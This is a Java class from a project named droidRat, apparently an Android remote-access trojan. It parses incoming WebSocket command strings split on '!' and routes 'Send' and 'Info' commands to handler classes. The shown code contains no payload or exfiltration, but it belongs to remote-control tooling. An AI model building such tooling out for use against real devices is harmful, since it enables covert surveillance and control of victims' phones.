package com.je_chen.droidRat.module.process.send.command.process_super;

import com.je_chen.droidRat.module.WebSocketServerEndPoint;
import com.je_chen.droidRat.module.process.send.command.process.InfoCommand;
import com.je_chen.droidRat.module.process.send.command.process.SendCommand;

public class CommandProcess {

    private final WebSocketServerEndPoint webSocketServerEndPoint;

    private CommandFather commandFather;

    private final SendCommand sendCommand;

    private final InfoCommand infoCommand;

    public CommandProcess() {
        webSocketServerEndPoint = new WebSocketServerEndPoint();
        sendCommand = new SendCommand(webSocketServerEndPoint);
        infoCommand = new InfoCommand(webSocketServerEndPoint);
    }

    public void processCommand(String rawString) {
        try {
            System.out.println("Process Command : " + rawString);
            String[] rawStringArray = rawString.split("!");
            switch (rawStringArray[0]) {

                case "Send":
                    commandFather = sendCommand;
                    commandFather.processCommand(rawStringArray[1]);
                    break;

                case "Info":
                    commandFather = infoCommand;
                    commandFather.processCommand(rawStringArray[1]);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
